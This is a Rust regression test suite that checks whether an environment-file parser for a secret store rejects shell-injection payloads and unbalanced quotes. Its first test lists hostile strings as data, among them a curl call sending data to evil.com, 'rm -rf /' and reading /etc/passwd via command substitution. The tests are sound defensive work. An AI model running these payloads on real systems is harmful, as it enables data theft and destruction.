//! # Tier 5: Regression & Security Exploit Suite
//!
//! Validates resilience against malicious or malformed environment files,
//! injection attacks, and historical vulnerability patterns.
//!
//! ## Invariants Under Test
//! - Rejection of all shell command substitution forms (`$()`, backticks).
//! - Rejection of shell function declarations and multi-statement separators (`;;`).
//! - Rejection of quote escaping exploits.
//!
//! ## Falsifiability
//! Any execution or acceptance of malicious payloads constitutes an immediate security failure.

use workstation_core::SecretStore;

// -----------------------------------------------------------------------------
// Section 1: Command Injection & AST Attack Vectors
// -----------------------------------------------------------------------------

/// Tests that command injection payloads inside environment files fail closed.
///
/// # Invariant Tested
/// "Rejects code injection, subshells, backticks, and function syntax."
///
/// # Falsification Condition
/// Fails if any command substitution syntax is evaluated or accepted.
#[test]
fn test_regression_command_injection_payloads() {
    let exploits = [
        ("Subshell expansion", "TOKEN=$(curl https://evil.com/leak)"),
        ("Backtick execution", "API_KEY=`rm -rf /`"),
        ("Double semicolon separator", "VAR=val;; echo hacked"),
        (
            "Function definition exploit",
            "function run_agent() { evil; }",
        ),
        (
            "Indented function exploit",
            "  function malicious() { id; }",
        ),
        (
            "Chained subshell",
            "SAFE_LOOKING_KEY=normal$(cat /etc/passwd)",
        ),
    ];

    for (name, payload) in exploits {
        let mut store = SecretStore::new();
        assert!(
            store.parse_str(payload, "exploit.env").is_err(),
            "Vulnerability test failed for {}: payload '{}' was erroneously accepted",
            name,
            payload
        );
    }
}

// -----------------------------------------------------------------------------
// Section 2: Quotation & Identifier Regression
// -----------------------------------------------------------------------------

/// Tests quotation boundary edge cases that historically caused parser crashes.
///
/// # Invariant Tested
/// Unbalanced quotes must fail closed with an informative error rather than panicking.
///
/// # Falsification Condition
/// Fails if parser panics or silently truncates strings.
#[test]
fn test_regression_unbalanced_quotes_robustness() {
    let edge_cases = [
        "KEY=\"",
        "KEY='",
        "KEY=\"val",
        "KEY=val\"",
        "KEY='val",
        "KEY=val'",
    ];

    for edge in edge_cases {
        let mut store = SecretStore::new();
        assert!(
            store.parse_str(edge, "edge.env").is_err(),
            "Edge case '{}' must be rejected due to unclosed quotes",
            edge
        );
    }
}
